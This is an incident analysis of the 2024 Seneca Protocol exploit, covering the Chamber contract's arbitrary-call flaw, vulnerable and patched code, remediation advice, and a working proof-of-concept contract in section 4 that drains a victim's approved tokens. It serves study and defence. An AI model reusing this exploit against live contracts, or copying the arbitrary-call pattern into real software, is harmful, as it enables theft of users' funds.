# Seneca — performOperations Arbitrary External Call Vulnerability Analysis

| Field | Details |
|------|------|
| **Date** | 2024-02 |
| **Protocol** | Seneca Protocol |
| **Chain** | Ethereum |
| **Loss** | ~$6,000,000 |
| **Attacker** | [0x94641c01](https://etherscan.io/address/0x94641c01a4937f2c8ef930580cf396142a2942dc) |
| **Vulnerable Contract** | [Chamber 0x65c210c5](https://etherscan.io/address/0x65c210c59B43EB68112b7a4f75C8393C36491F06) |
| **Victim** | [0x9CBF099f](https://etherscan.io/address/0x9CBF099ff424979439dFBa03F00B5961784c06ce) |
| **Stolen Token** | [Pendle PT 0xB05cABCd](https://etherscan.io/address/0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E) |
| **Root Cause** | The `performOperations()` function allows arbitrary contract calls via the `OPERATION_CALL(30)` action type, enabling the attacker to exploit the `transferFrom` approval the victim had granted to the Chamber contract and drain Pendle PT tokens |
| **PoC Source** | [DeFiHackLabs](https://github.com/SunWeb3Sec/DeFiHackLabs/blob/main/src/test/2024-02/Seneca_exp.sol) |

---

## 1. Vulnerability Overview

The `performOperations()` function of the Seneca Chamber contract can execute arbitrary calldata against arbitrary addresses via the `OPERATION_CALL` action. Because the victim had previously `approve`d the Chamber contract to spend their Pendle PT tokens, the attacker encoded `transferFrom(victim, attacker, balance)` calldata and passed it into `performOperations()`, draining ~$6M worth of tokens.

## 2. Vulnerable Code Analysis

```solidity
// ❌ Vulnerable code: OPERATION_CALL allows arbitrary external calls
interface IChamber {
    function performOperations(
        uint8[] memory actions,
        uint256[] memory values,
        bytes[] memory datas
    ) external payable;
}

// Internal implementation
uint8 constant OPERATION_CALL = 30;

function performOperations(
    uint8[] memory actions,
    uint256[] memory values,
    bytes[] memory datas
) external payable {
    for (uint i = 0; i < actions.length; i++) {
        if (actions[i] == OPERATION_CALL) {
            (address target, bytes memory callData) = abi.decode(datas[i], (address, bytes));
            // ← Executes arbitrary callData against arbitrary target — no access control
            (bool success,) = target.call{value: values[i]}(callData);
            require(success);
        }
    }
}

// ✅ Safe code: only calls targets on an allowed whitelist
mapping(address => bool) public allowedTargets;

function performOperations(...) external payable {
    for (uint i = 0; i < actions.length; i++) {
        if (actions[i] == OPERATION_CALL) {
            (address target, bytes memory callData) = abi.decode(datas[i], (address, bytes));
            require(allowedTargets[target], "target not allowed");
            // Block calls with the transferFrom selector
            bytes4 selector = bytes4(callData);
            require(selector != IERC20.transferFrom.selector, "transferFrom not allowed");
            (bool success,) = target.call{value: values[i]}(callData);
            require(success);
        }
    }
}
```

### On-Chain Source Code

Source: Sourcify verified

```solidity
// File: Chamber2.sol
contract Chamber {
    function performOperations(  // ❌ Vulnerability
        uint8[] calldata actions,
        uint256[] calldata values,
        bytes[] calldata datas
    ) whenNotPaused external payable returns (uint256 value1, uint256 value2) {
        OperationStatus memory status;
        uint256 actionsLength = actions.length;
        for (uint256 i = 0; i < actionsLength; i++) {
            uint8 action = actions[i];
            if (!status.hasAccrued && action < 10) {
                accumulate();
                status.hasAccrued = true;
            }
            if (action == Constants.OPERATION_ADD_COLLATERAL) {
                (int256 share, address to, bool skim) = abi.decode(datas[i], (int256, address, bool));
                depositCollateral(to, skim, _num(share, value1, value2));
            } else if (action == Constants.OPERATION_REPAY) {
                (int256 part, address to, bool skim) = abi.decode(datas[i], (int256, address, bool));
                _repay(to, skim, _num(part, value1, value2));
            } else if (action == Constants.OPERATION_REMOVE_COLLATERAL) {
                (int256 share, address to) = abi.decode(datas[i], (int256, address));
                _withdrawCollateral(to, _num(share, value1, value2));
                status.needsSolvencyCheck = true;
            } else if (action == Constants.OPERATION_BORROW) {
                (int256 amount, address to) = abi.decode(datas[i], (int256, address));
                (value1, value2) = _borrow(to, _num(amount, value1, value2));
                status.needsSolvencyCheck = true;
            } else if (action == Constants.OPERATION_UPDATE_PRICE) {
                (bool must_update, uint256 minRate, uint256 maxRate) = abi.decode(datas[i], (bool, uint256, uint256));
                (bool updated, uint256 rate) = updatePrice();
                require((!must_update || updated) && rate > minRate && (maxRate == 0 || rate < maxRate), "Chamber: rate not ok");
            } else if (action == Constants.OPERATION_BENTO_SETAPPROVAL) {
                (address user, address _masterContract, bool approved, uint8 v, bytes32 r, bytes32 s) =
    // ... (29 lines omitted) ...
                (bytes memory returnData, uint8 returnValues, OperationStatus memory returnStatus) = _extraOperation(action, status, values[i], datas[i], value1, value2);
                status = returnStatus;
                
                if (returnValues == 1) {
                    (value1) = abi.decode(returnData, (uint256));
                } else if (returnValues == 2) {
                    (value1, value2) = abi.decode(returnData, (uint256, uint256));
                }
            }
        }

        if (status.needsSolvencyCheck) {
            (, uint256 _exchangeRate) = updatePrice();
            require(_isSolvent(msg.sender, _exchangeRate), "Chamber: user insolvent");
        }
    }
```

```solidity
// File: SafeERC20.sol
    /**
     * @dev Transfer `value` amount of `token` from the calling contract to `to`. If `token` returns no value,
     * non-reverting calls are assumed to be successful.
     */
    function safeTransfer(IERC20 token, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transfer.selector, to, value));
    }

    /**
     * @dev Transfer `value` amount of `token` from `from` to `to`, spending the approval given by `from` to the
     * calling contract. If `token` returns no value, non-reverting calls are assumed to be successful.
     */
    function safeTransferFrom(IERC20 token, address from, address to, uint256 value) internal {
        _callOptionalReturn(token, abi.encodeWithSelector(token.transferFrom.selector, from, to, value));  // ❌ Vulnerability
    }

    /**
     * @dev Deprecated. This function has issues similar to the ones found in
     * {IERC20-approve}, and its usage is discouraged.
     *
     * Whenever possible, use {safeIncreaseAllowance} and {safeDecreaseAllowance} instead.
     */
    function safeApprove(IERC20 token, address spender, uint256 value) internal {
        // safeApprove should only be called when setting an initial allowance,
        // or when resetting it to zero. To increase and decrease it, use
        // 'safeIncreaseAllowance' and 'safeDecreaseAllowance'
        require(
            (value == 0) || (token.allowance(address(this), spender) == 0),
            "SafeERC20: approve from non-zero to non-zero allowance"
        );
        _callOptionalReturn(token, abi.encodeWithSelector(token.approve.selector, spender, value));
    }
```

```solidity
// File: IERC20.sol
    function transferFrom(address from, address to, uint256 amount) external returns (bool);  // ❌ Vulnerability
}
```

## 3. Attack Flow (ASCII Diagram)

```
Attacker
  │
  ├─→ [1] Query victim address and PT token balance
  │         └─ victim = 0x9CBF099ff...
  │         └─ ptBalance = PendlePT.balanceOf(victim)
  │
  ├─→ [2] Encode transferFrom calldata
  │         └─ abi.encodeCall(IERC20.transferFrom, (victim, attacker, ptBalance))
  │
  ├─→ [3] Call performOperations
  │         └─ actions = [OPERATION_CALL(30)]
  │         └─ datas = [abi.encode(PendlePT, calldata)]
  │
  ├─→ [4] Chamber executes PendlePT.transferFrom(victim, attacker, balance)
  │         └─ Exploiting the victim's approval granted to Chamber
  │
  └─→ [5] ~$6M in Pendle PT tokens drained
```

## 4. PoC Code (Core Logic + Comments)

```solidity
interface IChamber {
    function performOperations(
        uint8[] memory actions,
        uint256[] memory values,
        bytes[] memory datas
    ) external payable;
}

contract AttackContract {
    IChamber constant chamber  = IChamber(0x65c210c59B43EB68112b7a4f75C8393C36491F06);
    IERC20   constant pendlePT = IERC20(0xB05cABCd99cf9a73b19805edefC5f67CA5d1895E);
    address  constant victim   = 0x9CBF099ff424979439dFBa03F00B5961784c06ce;

    uint8 constant OPERATION_CALL = 30;

    function testExploit() external {
        // [1] Query victim's balance
        uint256 balance = pendlePT.balanceOf(victim);

        // [2] Encode transferFrom calldata
        bytes memory transferCalldata = abi.encodeCall(
            IERC20.transferFrom,
            (victim, address(this), balance)
        );

        // [3] Execute arbitrary call via performOperations
        uint8[]   memory actions = new uint8[](1);
        uint256[] memory values  = new uint256[](1);
        bytes[]   memory datas   = new bytes[](1);

        actions[0] = OPERATION_CALL;
        values[0]  = 0;
        datas[0]   = abi.encode(address(pendlePT), transferCalldata);

        // [4] Chamber transfers victim's tokens to the attacker
        chamber.performOperations(actions, values, datas);
    }
}
```

## 5. Vulnerability Classification (Table)

| Category | Details |
|------|----------|
| **Vulnerability Type** | Arbitrary External Call |
| **CWE** | CWE-20: Improper Input Validation |
| **Attack Vector** | External (direct call to performOperations) |
| **DApp Category** | DeFi Multi-Operation Contract |
| **Impact** | Unauthorized drain of approved tokens ($6M) |

## 6. Remediation Recommendations

1. **Target whitelist**: Strictly restrict the addresses that `OPERATION_CALL` is permitted to invoke
2. **Block dangerous selectors**: Reject token-transfer selectors such as `transferFrom` and `transfer` during calldata validation
3. **Caller validation**: Verify that `msg.sender` is the intended beneficiary of the operation when `performOperations()` is called
4. **Remove OPERATION_CALL**: Eliminate the arbitrary external call feature entirely and replace it with explicit, named functions

## 7. Lessons Learned

- The `performOperations()` pattern allows arbitrary calls for flexibility, but this means any approval held by the contract can be exploited by an attacker.
- When a user grants an `approve` to a contract, every approval becomes at risk if that contract can execute arbitrary calls.
- DeFi multi-operation contracts must never permit an "arbitrary call" capability; only explicitly whitelisted functions should be executable.